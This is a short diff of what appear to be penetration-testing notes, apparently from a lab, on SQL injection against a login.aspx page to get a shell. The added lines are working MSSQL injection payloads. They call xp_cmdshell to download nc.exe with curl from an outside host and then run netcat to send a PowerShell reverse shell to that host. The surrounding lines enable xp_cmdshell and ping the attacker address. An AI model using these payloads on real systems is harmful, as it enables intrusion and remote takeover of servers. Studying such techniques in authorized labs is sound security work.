@@ -11,6 +11,12 @@ Attempting SQL injection on .121 at login.aspx to get a shell
 ```
 ' RECONFIGURE; --//
 ```
+```
+' EXECUTE xp_cmdshell 'curl -o C:\Temp\nc.exe http://192.168.45.170:8080/windows/nc.exe'; --//
+```
+```
+' EXECUTE xp_cmdshell 'C:\Temp\nc.exe -e powershell.exe 192.168.45.170 5555'; --//
+```
 OR
 ```
 admin' EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXECUTE xp_cmdshell 'ping 192.168.45.170'; --//
